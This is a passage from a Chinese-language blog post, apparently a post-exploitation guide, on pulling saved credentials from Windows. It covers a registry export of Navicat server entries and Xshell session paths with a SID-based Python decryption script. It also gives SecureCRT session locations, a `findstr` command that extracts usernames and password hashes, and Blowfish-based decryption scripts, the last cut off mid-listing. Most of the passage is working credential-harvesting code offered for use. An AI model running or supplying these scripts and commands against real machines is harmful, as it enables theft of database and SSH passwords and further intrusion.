id="不能RDP连接到机器"><a href="#不能RDP连接到机器" class="headerlink" title="不能RDP连接到机器"></a>不能RDP连接到机器</h4><p>使用命令来保存注册列表的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg export HKCU\SOFTWARE\PremiumSoft\Navicat\Servers navicat</span><br></pre></td></tr></table></figure><p>提取出来的内容如下，解密方式和上面一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers\test]</span><br><span class="line">&quot;ConnType&quot;&#x3D;&quot;ctMYSQL&quot;</span><br><span class="line">&quot;ConnTypeOra&quot;&#x3D;&quot;ctoBasic&quot;</span><br><span class="line">&quot;TNS&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;DatabaseFileName&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;Host&quot;&#x3D;&quot;127.0.0.1&quot;</span><br><span class="line">&quot;Port&quot;&#x3D;dword:00000cea</span><br><span class="line">&quot;InitialDatabase&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;OraServiceNameType&quot;&#x3D;&quot;snServiceName&quot;</span><br><span class="line">&quot;MSSQLAuthenMode&quot;&#x3D;&quot;mamSQLServer&quot;</span><br><span class="line">&quot;UserName&quot;&#x3D;&quot;root&quot;</span><br><span class="line">&quot;Pwd&quot;&#x3D;&quot;EF176B08C2D7735DB81C&quot;</span><br><span class="line">&quot;AskPassword&quot;&#x3D;&quot;false&quot;</span><br><span class="line">&quot;Codepage&quot;&#x3D;dword:0000fde9</span><br><span class="line">&quot;OraRole&quot;&#x3D;&quot;orDefault&quot;</span><br><span class="line">&quot;OraOSAuthentication&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;AutoConnect&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;QuerySavePath&quot;&#x3D;&quot;C:\\Users\\ascotbe\\Documents\\Navicat\\MySQL\\servers\\test&quot;</span><br><span class="line">&quot;UseCompression&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;UseCharacterSet&quot;&#x3D;dword:00000001</span><br><span class="line">&quot;UsePingInterval&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;PingInterval&quot;&#x3D;dword:000000f0</span><br><span class="line">&quot;UseNamedPipe&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;NamedPipeSocket&quot;&#x3D;&quot;&#x2F;tmp&#x2F;mysql.sock&quot;</span><br><span class="line">&quot;SQLiteEncrypted&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;UseEncryption&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;UseAdvSettings&quot;&#x3D;&quot;false&quot;</span><br><span class="line">&quot;UseSSL&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;UseSSLAuthen&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;PGSSLMode&quot;&#x3D;&quot;smRequire&quot;</span><br><span class="line">&quot;ClientKey&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;ClientCert&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;CACert&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;VerifyCACert&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;Cipher&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;PGSSLCRL&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;UseSSH&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;SSH_Host&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;SSH_Port&quot;&#x3D;dword:00000016</span><br><span class="line">&quot;SSH_UserName&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;SSH_AuthenMethod&quot;&#x3D;&quot;saPassword&quot;</span><br><span class="line">&quot;SSH_SavePassword&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;SSH_PrivateKey&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;SSH_SavePassphrase&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;UseHTTP&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_URL&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_EncodeBase64&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_Authen&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_Username&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HttpSavePassword&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_CertAuth&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_ClientKey&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_ClientCert&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_CACert&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_Passphrase&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_Proxy&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_ProxyHost&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_ProxyPort&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_ProxyUsername&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HttpProxySavePassword&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;NSYID&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;NSYHash&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;NSYNavicatID&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;NSYDirtyFlag&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;AskForSavePassword&quot;&#x3D;dword:00000000</span><br></pre></td></tr></table></figure><h2 id="SSH密码"><a href="#SSH密码" class="headerlink" title="SSH密码"></a>SSH密码</h2><h3 id="Xshell密码"><a href="#Xshell密码" class="headerlink" title="Xshell密码"></a>Xshell密码</h3><p>默认保存路径</p><table><thead><tr><th>版本</th><th>路径</th></tr></thead><tbody><tr><td>Xshell 5</td><td>%userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td>Xshell 6</td><td>%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td></tr><tr><td>Xshell 7</td><td>%userprofile%\Documents\NetSarang Computer\7\Xshell\Sessions</td></tr></tbody></table><p>关于xshell加密方式可以查看<a href="https://rcoil.me/2019/09/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/">这篇文章</a></p><h4 id="Xshell-5-amp-Xshell-6"><a href="#Xshell-5-amp-Xshell-6" class="headerlink" title="Xshell 5&amp;Xshell 6"></a>Xshell 5&amp;Xshell 6</h4><p>首先需获取到用户的SID值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\ascotbe&gt; whoami &#x2F;user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名           SID</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">樱岛麻衣\ascotbe S-1-5-21-1645164750-2672341361-3879437546-1000</span><br></pre></td></tr></table></figure><p>然后使用脚本解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\xshell.py -s username+sid -p <span class="string">&quot;文件路径&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/19.png" alt="image-20210611142341029"></p><p>脚本代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line"><span class="comment">#pip install pycryptodome</span></span><br><span class="line"><span class="comment">#pip install pywin32</span></span><br><span class="line"><span class="keyword">from</span> win32api <span class="keyword">import</span> GetComputerName, GetUserName</span><br><span class="line"><span class="keyword">from</span> win32security <span class="keyword">import</span> LookupAccountName, ConvertSidToStringSid</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_string</span>(<span class="params">a1, a2</span>):</span></span><br><span class="line">    v1 = base64.b64decode(a2)</span><br><span class="line">    v3 = ARC4.new(SHA256.new(a1.encode(<span class="string">&#x27;ascii&#x27;</span>)).digest()).decrypt(v1[:<span class="built_in">len</span>(v1) - <span class="number">0x20</span>])</span><br><span class="line">    <span class="keyword">if</span> SHA256.new(v3).digest() == v1[-<span class="number">32</span>:]:</span><br><span class="line">        <span class="keyword">return</span> v3.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;xsh, xfp password decrypt&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-s&quot;</span>, <span class="string">&quot;--sid&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;`username`+`sid`, user `whoami /user` in command.&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;the password in sessions or path of sessions&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.sid:</span><br><span class="line">    args.sid = GetUserName() + ConvertSidToStringSid(LookupAccountName(GetComputerName(), GetUserName())[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.password:</span><br><span class="line">    args.password = os.path.join(os.environ[<span class="string">&quot;USERPROFILE&quot;</span>], <span class="string">r&quot;Documents\NetSarang Computer\6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(args.password):</span><br><span class="line">    r = decrypt_string(args.sid, args.password)</span><br><span class="line">    <span class="keyword">if</span> r:</span><br><span class="line">        print(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(args.password):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> f.endswith(<span class="string">&quot;.xsh&quot;</span>) <span class="keyword">or</span> f.endswith(<span class="string">&quot;.xfp&quot;</span>):</span><br><span class="line">            filepath = os.path.join(root, f)</span><br><span class="line">            cfg = configparser.ConfigParser()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cfg.read(filepath)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                cfg.read(filepath, encoding=<span class="string">&quot;utf-16&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> f.endswith(<span class="string">&quot;.xsh&quot;</span>):</span><br><span class="line">                    host = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(cfg[<span class="string">&quot;CONNECTION&quot;</span>][<span class="string">&quot;Host&quot;</span>], cfg[<span class="string">&quot;CONNECTION&quot;</span>][<span class="string">&quot;Port&quot;</span>])</span><br><span class="line">                    username = cfg[<span class="string">&quot;CONNECTION:AUTHENTICATION&quot;</span>][<span class="string">&quot;UserName&quot;</span>]</span><br><span class="line">                    password = decrypt_string(args.sid, cfg[<span class="string">&quot;CONNECTION:AUTHENTICATION&quot;</span>][<span class="string">&quot;Password&quot;</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    host = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Host&quot;</span>], cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Port&quot;</span>])</span><br><span class="line">                    username = cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;UserName&quot;</span>]</span><br><span class="line">                    password = decrypt_string(args.sid, cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Password&quot;</span>])</span><br><span class="line">                print(</span><br><span class="line">                    <span class="string">f&quot;<span class="subst">&#123;filepath:=^<span class="number">100</span>&#125;</span>\nHost:     <span class="subst">&#123;host&#125;</span>\nUsername: <span class="subst">&#123;username&#125;</span>\nPassword: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">f&quot;<span class="subst">&#123;filepath:=^<span class="number">100</span>&#125;</span>\nError:<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Xshell-7"><a href="#Xshell-7" class="headerlink" title="Xshell 7"></a>Xshell 7</h4><p>这个版本目前我没有找到解密方式，只能使用比较蠢的方式</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/20.gif" alt="1"></p><p>星号密码查看器：<a href="https://github.com/Ascotbe/Random-img/blob/master/WindowsGrabPassword/ViewPass.exe">备份下载</a></p><h3 id="SecureCRT密码"><a href="#SecureCRT密码" class="headerlink" title="SecureCRT密码"></a>SecureCRT密码</h3><p>保存位置如下，绿色版本的话在下载的文件夹中</p><table><thead><tr><th>版本</th><th>路径</th></tr></thead><tbody><tr><td>全版本通用</td><td>%APPDATA%\VanDyke\Config\Sessions</td></tr></tbody></table><h4 id="小于7-X版本"><a href="#小于7-X版本" class="headerlink" title="小于7.X版本"></a>小于7.X版本</h4><p>把<code>*.ini</code>文件拉取下来直接使用脚本解密，这个版本没有测试过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt SSHv2 passwords stored in VanDyke SecureCRT session files</span></span><br><span class="line"><span class="comment"># Can be found on Windows in:</span></span><br><span class="line"><span class="comment">#   %APPDATA%\VanDyke\Config\Sessions\sessionname.ini</span></span><br><span class="line"><span class="comment"># Tested with version 7.2.6 (build 606) for Windows</span></span><br><span class="line"><span class="comment"># Eloi Vanderbeken - Synacktiv</span></span><br><span class="line"><span class="comment">#  Decrypt SSHv2 passwords stored in VanDyke SecureCRT</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># C:\&gt;python SecureCRT-decryptpass.py -h</span></span><br><span class="line"><span class="comment"># usage: SecureCRT-decryptpass.py [-h] files [files ...]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#positional arguments:</span></span><br><span class="line"><span class="comment">#  files       session file(s)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#optional arguments:</span></span><br><span class="line"><span class="comment">#  -h, --help  show this help message and exit</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># C:\&gt;python SecureCRT-decryptpass.py C:\Users\user1\AppData\Roaming\VanDyke\Config\Sessions\192.168.0.1.ini</span></span><br><span class="line"><span class="comment"># C:\Users\user1\AppData\Roaming\VanDyke\Config\Sessions\192.168.0.1.ini</span></span><br><span class="line"><span class="comment"># ssh -p 22 user@192.168.0.1 # 123456</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">password</span>) :</span></span><br><span class="line">    c1 = Blowfish.new(<span class="string">&#x27;5F B0 45 A2 94 17 D9 16 C6 C6 A2 FF 06 41 82 B7&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>), Blowfish.MODE_CBC, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    c2 = Blowfish.new(<span class="string">&#x27;24 A6 3D DE 5B D3 B3 82 9C 7E 06 F4 08 16 AA 07&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>), Blowfish.MODE_CBC, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    padded = c1.decrypt(c2.decrypt(password.decode(<span class="string">&#x27;hex&#x27;</span>))[<span class="number">4</span>:-<span class="number">4</span>])</span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> padded[:<span class="number">2</span>] != <span class="string">&#x27;\x00\x00&#x27;</span> :</span><br><span class="line">        p += padded[:<span class="number">2</span>]</span><br><span class="line">        padded = padded[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> p.decode(<span class="string">&#x27;UTF-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">REGEX_HOSTNAME = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Hostname&quot;=([^\r\n]*)&#x27;</span>)</span><br><span class="line">REGEX_PASWORD = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Password&quot;=u([0-9a-f]+)&#x27;</span>)</span><br><span class="line">REGEX_PORT = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;D:&quot;\[SSH2\] Port&quot;=([0-9a-f]&#123;8&#125;)&#x27;</span>)</span><br><span class="line">REGEX_USERNAME = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Username&quot;=([^\r\n]*)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hostname</span>(<span class="params">x</span>) :</span></span><br><span class="line">    m = REGEX_HOSTNAME.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">password</span>(<span class="params">x</span>) :</span></span><br><span class="line">    m = REGEX_PASWORD.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> decrypt(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">port</span>(<span class="params">x</span>) :</span></span><br><span class="line">    m = REGEX_PORT.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-p %d &#x27;</span>%(<span class="built_in">int</span>(m.group(<span class="number">1</span>), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">username</span>(<span class="params">x</span>) :</span></span><br><span class="line">    m = REGEX_USERNAME.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>) + <span class="string">&#x27;@&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;files&#x27;</span>, <span class="built_in">type</span>=argparse.FileType(<span class="string">&#x27;r&#x27;</span>), nargs=<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    <span class="built_in">help</span>=<span class="string">&#x27;session file(s)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> args.files :</span><br><span class="line">    c = f.read().replace(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> f.name</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ssh %s%s%s # %s&quot;</span>%(port(c), username(c), hostname(c), password(c))</span><br></pre></td></tr></table></figure><h4 id="7-X版本"><a href="#7-X版本" class="headerlink" title="7.X版本"></a>7.X版本</h4><p>进入目录提取文件中的连接IP、端口、账号、hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr &#x2F;si &#x2F;c:&quot;Hostname&quot; &#x2F;c:&quot;\&quot;Username\&quot;&#x3D;&quot; &#x2F;c:&quot;\&quot;Password\&quot;&#x3D;&quot; &#x2F;c:&quot;\&quot;[SSH2] Port\&quot;&#x3D;&quot; *.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/21.png" alt="image-20210611152808283"></p><p>然后使用脚本进行解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#注意去除hash的第一位 &quot;u&quot;</span><br><span class="line">python3  SecureCRT.py dec hash</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/22.png" alt="image-20210611153105145"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 